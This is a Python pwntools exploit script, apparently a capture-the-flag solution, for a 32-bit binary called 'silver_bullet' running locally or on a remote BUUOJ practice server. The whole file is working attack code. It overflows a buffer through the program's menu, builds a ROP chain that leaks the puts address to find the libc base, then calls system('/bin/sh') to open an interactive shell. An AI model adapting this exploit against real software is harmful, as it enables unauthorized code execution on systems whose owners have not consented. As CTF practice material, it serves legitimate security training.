#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./silver_bullet'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]
		else :
			io=remote('node3.buuoj.cn',28250)
			elf=ELF(elfelf)
			libc=ELF('../../i386libc/x86_libc.so.6')
			one_gadgaet=[0x45226,0x4527a,0xf0364,0xf1207]


		def add(a):
			io.sendlineafter('Your choice :','1')
			io.sendafter(' :',a)

		def edit(a):
			io.sendlineafter('Your choice :','2')
			io.sendafter('of bullet :',a)

		def attack():
			io.sendlineafter('Your choice :','3')
	
		add('a'*0x2f+'\x00')
		edit('a')
		edit('ada'+'1111'+p32(elf.plt['puts'])+p32(0x080484F0)+p32(elf.got['puts']))
		attack()
		attack()
		
		
		libc_base=u32(io.recvuntil('\xf7')[-4:])-libc.sym['puts']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']


		add('a'*0x2f+'\x00')
		edit('a')
		edit('ada'+'1111'+p32(system_addr)+p32(0x080484F0)+p32(bin_sh_addr))
		attack()
		attack()






		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue